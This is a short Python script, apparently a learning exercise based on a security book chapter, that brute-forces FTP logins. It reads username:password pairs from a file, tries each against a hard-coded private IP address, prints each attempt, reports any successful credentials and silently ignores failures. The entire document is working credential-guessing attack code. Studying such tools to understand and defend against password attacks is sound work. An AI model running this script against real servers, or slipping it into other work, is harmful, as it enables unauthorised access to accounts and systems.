# A FPT brute force login script, based on chapter 2.
# Python 3.4

"""
    Another very simple, just to see how things work. Nothing special here.

    #TODO: Add args and thread options.

"""


import ftplib


def brute_force(hostname, password_file):

    with open(password_file, 'r') as passwords:

        for line in passwords.readlines():

            user_name = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            print("[-] Testing login with: {0} / {1}".format(user_name, password))

            try:

                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)
                print("[+] Successful login on {0} with {1} / {2}".format(hostname, user_name, password))
                ftp.quit()
                return user_name,password

            except Exception as error:

                pass

        print("Could not connect with any of given usernames:passwords")
        return None,None

host = "192.168.25.87"
password_file = "password.txt"

brute_force(host, password_file)